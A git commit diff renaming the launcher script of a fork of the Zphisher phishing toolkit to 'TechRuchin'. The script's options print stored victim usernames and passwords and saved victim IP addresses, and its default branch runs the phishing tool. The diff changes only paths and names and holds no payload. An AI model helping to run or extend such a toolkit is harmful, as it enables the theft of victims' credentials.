3640db10db94f6f3680749b622bf290656baf85a
RuchinHimasha <81069002+RuchinHimasha@users.noreply.github.com>
2024-04-07 14:05:14 +0530

    Update launch.sh

--- scripts/launch.sh
+++ scripts/launch.sh
@@ -1,15 +1,15 @@
 #!/bin/bash
 
-# https://github.com/htr-tech/zphisher
+# https://github.com/RuchinHimasha/TechRuchin
 
 if [[ $(uname -o) == *'Android'* ]];then
-	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
+	TECHRUCHIN_ROOT="/data/data/com.termux/files/usr/opt/TechRuchin"
 else
-	export ZPHISHER_ROOT="/opt/zphisher"
+	export TECHRUCHIN_ROOT="/opt/TechRuchin"
 fi
 
 if [[ $1 == '-h' || $1 == 'help' ]]; then
-	echo "To run Zphisher type \`zphisher\` in your cmd"
+	echo "To run Zphisher type \`TechRuchin\` in your cmd"
 	echo
 	echo "Help:"
 	echo " -h | help : Print this menu & Exit"
@@ -17,16 +17,16 @@ if [[ $1 == '-h' || $1 == 'help' ]]; then
 	echo " -i | ip   : View Saved Victim IP"
 	echo
 elif [[ $1 == '-c' || $1 == 'auth' ]]; then
-	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
+	cat $TECHRUCHIN_ROOT/auth/usernames.dat 2> /dev/null || { 
 		echo "No Credentials Found !"
 		exit 1
 	}
 elif [[ $1 == '-i' || $1 == 'ip' ]]; then
-	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
+	cat $TECHRUCHIN_ROOT/auth/ip.txt 2> /dev/null || {
 		echo "No Saved IP Found !"
 		exit 1
 	}
 else
-	cd $ZPHISHER_ROOT
-	bash ./zphisher.sh
+	cd $TECHRUCHIN_ROOT
+	bash ./TechRuchin.sh
 fi
